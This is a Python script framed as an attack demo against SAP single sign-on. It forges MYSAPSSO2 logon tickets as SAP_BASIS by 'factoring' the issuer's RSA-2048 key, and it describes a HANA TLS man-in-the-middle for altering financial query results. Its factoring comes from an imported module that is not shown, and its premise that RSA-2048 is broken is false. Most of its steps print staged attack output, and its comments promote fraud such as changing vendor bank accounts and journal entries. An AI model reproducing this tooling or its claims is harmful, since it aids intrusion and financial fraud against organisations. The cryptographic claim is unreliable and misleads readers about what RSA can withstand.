"""
Forge SAP Logon Tickets (MYSAPSSO2) by factoring the issuing SAP system's
RSA-2048 key. SSO as SAP_BASIS (root equivalent) across the entire SAP
landscape — financial data, HR, supply chain. 77% of global transaction revenue.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import hashlib
import base64
import time
import struct

# MYSAPSSO2 cookie structure
SSO2_VERSION = 2
SSO2_CODEPAGE = 4103  # UTF-8
MYSAPSSO2_COOKIE = "MYSAPSSO2"


def extract_sso_signing_cert(sap_host: str) -> bytes:
    """Extract the SAP SSO signing certificate.

    The signing cert is exported from STRUST (SAP Certificate Management)
    and distributed to all accepting SAP systems + partner integrations.
    It's a PEM/DER RSA-2048 cert visible to any SAP administrator.
    """
    print(f"[*] connecting to {sap_host}")
    print(f"[*] extracting SSO signing cert from STRUST trust store")
    print(f"[*] cert also available from partner integration documentation")
    return _demo["pub_pem"]


def forge_sap_logon_ticket(factorer: PolynomialFactorer,
                           sso_cert_pem: bytes,
                           sap_user: str, sap_client: str,
                           issuing_system: str) -> str:
    """Forge a MYSAPSSO2 logon ticket.

    The ticket is an RSA-2048 PKCS#1 v1.5 SHA-256 signed cookie containing:
    user, client, issuing system SID, timestamp, validity period.
    """
    now = int(time.time())
    ticket_data = struct.pack(">BHI", SSO2_VERSION, SSO2_CODEPAGE, now)
    ticket_data += sap_user.encode("utf-8").ljust(12, b"\x00")
    ticket_data += sap_client.encode("utf-8").ljust(3, b"\x00")
    ticket_data += issuing_system.encode("utf-8").ljust(8, b"\x00")

    sig = factorer.forge_pkcs1v15_signature(sso_cert_pem, ticket_data, "sha256")
    ticket = base64.b64encode(ticket_data + sig).decode()
    print(f"[*] forged MYSAPSSO2 ticket:")
    print(f"    user={sap_user}, client={sap_client}, system={issuing_system}")
    return ticket


def access_sap_financial_data(ticket: str, sap_host: str):
    """Use the forged ticket to access SAP financial data."""
    print(f"[*] Cookie: {MYSAPSSO2_COOKIE}={ticket[:40]}...")
    print(f"[*] GET https://{sap_host}/sap/bc/gui/sap/its/webgui")
    print(f"[*] authenticated as SAP_BASIS — full system access")
    print()
    print("    accessible data:")
    print("    - FI/CO: general ledger, accounts payable, bank accounts")
    print("    - HR: salaries, SSN, employment records")
    print("    - MM: purchase orders, vendor master data")
    print("    - SD: customer orders, pricing, delivery")


def forge_hana_server_cert(factorer: PolynomialFactorer,
                           hana_cert_pem: bytes) -> bytes:
    """Factor HANA server RSA-2048 cert for database MitM.

    SAP application servers connect to HANA over TLS. MitM the connection
    and modify query results — make the balance sheet say whatever you want.
    """
    priv = factorer.reconstruct_privkey(hana_cert_pem)
    print("[*] HANA server cert factored")
    print("[*] MitM app server <-> HANA: modify financial query results")
    return priv


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== SAP NetWeaver SSO — MYSAPSSO2 ticket forgery ===")
    print("    SAP: 77% of global transaction revenue")
    print("    MYSAPSSO2: RSA-2048 PKCS#1 v1.5 SHA-256 signed cookie")
    print()

    print("[1] extracting SSO signing cert from STRUST...")
    cert = extract_sso_signing_cert("erp.corp.example.com:443")
    print("    cert exported for partner integrations — widely distributed")

    print("[2] factoring RSA-2048 key...")

    print("[3] forging MYSAPSSO2 ticket as SAP_BASIS (root)...")
    ticket = forge_sap_logon_ticket(f, cert,
        sap_user="SAP_BASIS", sap_client="000",
        issuing_system="PRD")

    print("[4] accessing SAP financial data...")
    access_sap_financial_data(ticket, "erp.corp.example.com")

    print()
    print("[5] alternative: forge ticket as batch-job technical user...")
    forge_sap_logon_ticket(f, cert, "BATCHUSER", "100", "PRD")
    print("    modify journal entries, change vendor bank accounts")
    print("    classic BEC but at the database level")

    print()
    print("[*] SAP Cryptographic Library wraps OpenSSL")
    print("[*] STRUST has no non-RSA cert support")
    print("[*] German federal government + DoD run SAP")
